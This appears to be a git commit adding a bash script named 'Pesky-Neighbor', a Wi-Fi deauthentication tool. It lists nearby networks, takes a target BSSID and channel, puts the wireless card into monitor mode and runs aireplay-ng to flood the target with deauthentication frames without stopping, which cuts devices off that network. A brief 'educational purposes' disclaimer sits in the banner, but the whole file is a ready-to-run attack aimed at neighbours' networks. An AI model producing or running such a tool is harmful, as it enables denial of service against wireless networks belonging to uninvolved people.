0d10f76de5a74a892241d525e77e7bfa0496a41d
YAKM0 <112671796+YAKM0@users.noreply.github.com>
2022-09-03 00:48:03 -0500

    Create deauth.sh

---
+++ deauth.sh
@@ -0,0 +1,42 @@
+#!/bin/bash
+clear
+echo "
+=============================================================
+Script: Pesky-Neighbor    | this is only for educational
+Description: Deauth tool  | purposes. YAKM0 is not 
+Author: YAKM0             | responsible for damages.
+Email: YAKM0@pm.me        | Happy hacking.
+=============================================================
+"
+
+sleep 5
+clear
+nmcli dev wifi | awk '$2 != "--"' |awk '{print NR,$1,$2,$4}'
+sleep 1
+echo "
+Copy targets BSSID and paste below WITH NO EXTRA SPACING
+"
+read Target
+sleep 2
+echo "type Targets channel below, channel number comes after network name, EX. target_network 6"
+read Chan
+clear
+echo "You must start an interface in managed mode, ex. wlan0. Type which interface you want to start in managed mode below:"
+read interface
+while true; do
+    read -p "You chose $interface, is this correct? " yn
+    case $yn in
+        [Yy]* ) break;;
+        [Nn]* ) exit;;
+        * ) echo "Please answer yes or no.";;
+    esac
+done
+sudo airmon-ng start $interface > /dev/null 2>&1
+clear
+sudo timeout 2s airodump-ng -d $Target -c $Chan wlan0mon > /dev/null 2>&1
+sudo aireplay-ng -0 0 -a $Target wlan0mon --ignore-negative-one
+sleep 3
+clear
+echo "Returning to managed mode"
+sleep 2
+sudo airmon-ng stop wlan0mon > /dev/null 2>&1
